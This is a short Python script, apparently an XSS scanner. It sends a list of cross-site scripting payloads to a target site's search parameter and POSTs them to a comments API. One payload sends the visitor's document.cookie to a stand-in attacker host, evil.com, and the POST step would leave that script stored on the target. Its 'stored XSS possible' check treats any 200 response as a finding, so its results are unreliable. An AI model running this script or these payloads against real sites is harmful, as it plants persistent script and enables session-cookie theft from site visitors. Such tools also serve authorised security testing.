import requests
import sys

def test_xss(target_url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "';alert('XSS');//",
        "<script>document.location='http://evil.com/'+document.cookie</script>"
    ]
    
    print(f"[+] Testing XSS on {target_url}")
    
    for payload in payloads:
        try:
            # Test in search parameter
            response = requests.get(f"{target_url}/?search={payload}", timeout=5)
            if payload in response.text:
                print(f"[!] REFLECTED XSS: {payload[:30]}...")
            
            # Test in POST data
            data = {"comment": payload}
            response = requests.post(f"{target_url}/api/comments", json=data, timeout=5)
            if response.status_code == 200:
                print(f"[!] STORED XSS POSSIBLE: {payload[:30]}...")
                
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    test_xss(target)
